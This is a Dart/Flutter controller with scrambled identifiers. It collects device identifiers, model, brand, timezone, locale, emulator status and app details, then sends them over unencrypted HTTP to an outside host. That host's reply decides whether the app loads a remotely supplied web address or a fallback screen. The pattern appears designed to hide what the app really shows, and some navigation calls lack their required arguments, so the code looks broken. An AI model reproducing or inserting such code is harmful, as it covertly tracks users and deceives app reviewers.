import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class PageLogic extends GetxController {

  var omntzpqkw = RxBool(false);
  var ncriyghmlb = RxBool(true);
  var xrdhe = RxString("");
  var mallie = RxBool(false);
  var thiel = RxBool(true);
  final aphotvf = Dio();


  InAppWebViewController? webViewController;

  dynamic iphkolc(){
    final hbvsomxpj = InternetConnectionChecker.instance;
    final aocivfek = hbvsomxpj.onStatusChange.skip(1).listen(
          (InternetConnectionStatus szqnfoaud) {
        if (szqnfoaud == InternetConnectionStatus.connected) {
          clzwt();
        } else {
          Get.toNamed()?.then((_){
            clzwt();
          });
        }
      },
    );
    return aocivfek;
  }

  Future<bool> lzvnkxbd() async {
    final bool sxwovfql = await InternetConnectionChecker.instance.hasConnection;
    if(!sxwovfql){
      Get.toNamed()?.then((_){
        clzwt();
      });
    }
    return sxwovfql;
  }

  @override
  void onInit() {
    super.onInit();
    iphkolc();
    clzwt();
  }


  Future<void> clzwt() async {

    var ozbvqcnm = await lzvnkxbd();
    if(!ozbvqcnm){
      return;
    }

    mallie.value = true;
    thiel.value = true;
    ncriyghmlb.value = false;

    aphotvf.post("http://bid.zailormin.com/bXWBfbh",data: await ayswzmbqn()).then((value) {
      var jcwykren = value.data["jcwykren"] as String;
      var hoajgkl = value.data["hoajgkl"] as bool;
      if (hoajgkl) {
        xrdhe.value = jcwykren;
        amparo();
      } else {
        rath();
      }
    }).catchError((e) {
      ncriyghmlb.value = true;
      thiel.value = true;
      mallie.value = false;
    });
  }

  Future<Map<String, dynamic>> ayswzmbqn() async {
    final DeviceInfoPlugin qapwsnk = DeviceInfoPlugin();
    PackageInfo gdrp_fzvrclys = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var akfcu = Platform.localeName;
    var RiThKMA = currentTimeZone;

    var pHTfRb = gdrp_fzvrclys.packageName;
    var eXLMWCA = gdrp_fzvrclys.version;
    var dBCxvn = gdrp_fzvrclys.buildNumber;

    var JSdtXKH = gdrp_fzvrclys.appName;
    var VBmLcIl = "";
    var OhcY  = "";
    var YRZxl = "";
    var noelOkuneva = "";
    var camronWill = "";
    var estellMoen = "";
    var josianneKovacek = "";
    var daisyMcClure = "";


    var lRyY = "";
    var HRLjCdKO = false;

    if (GetPlatform.isAndroid) {
      lRyY = "android";
      var fankthm = await qapwsnk.androidInfo;

      YRZxl = fankthm.brand;

      VBmLcIl  = fankthm.model;
      OhcY = fankthm.id;

      HRLjCdKO = fankthm.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lRyY = "ios";
      var gclfpq = await qapwsnk.iosInfo;
      YRZxl = gclfpq.name;
      VBmLcIl = gclfpq.model;

      OhcY = gclfpq.identifierForVendor ?? "";
      HRLjCdKO  = gclfpq.isPhysicalDevice;
    }

    var res = {
      "JSdtXKH": JSdtXKH,
      "dBCxvn": dBCxvn,
      "eXLMWCA": eXLMWCA,
      "pHTfRb": pHTfRb,
      "VBmLcIl": VBmLcIl,
      "RiThKMA": RiThKMA,
      "YRZxl": YRZxl,
      "OhcY": OhcY,
      "akfcu": akfcu,
      "lRyY": lRyY,
      "HRLjCdKO": HRLjCdKO,
      "noelOkuneva" : noelOkuneva,
      "camronWill" : camronWill,
      "estellMoen" : estellMoen,
      "josianneKovacek" : josianneKovacek,
      "daisyMcClure" : daisyMcClure,

    };
    return res;
  }

  Future<void> rath() async {
    Get.offAllNamed("/rath");
  }

  Future<void> amparo() async {
    Get.offAllNamed("/amparo");
  }

  @override
  void dispose() {
    iphkolc().cancel();
    super.dispose();
  }

}
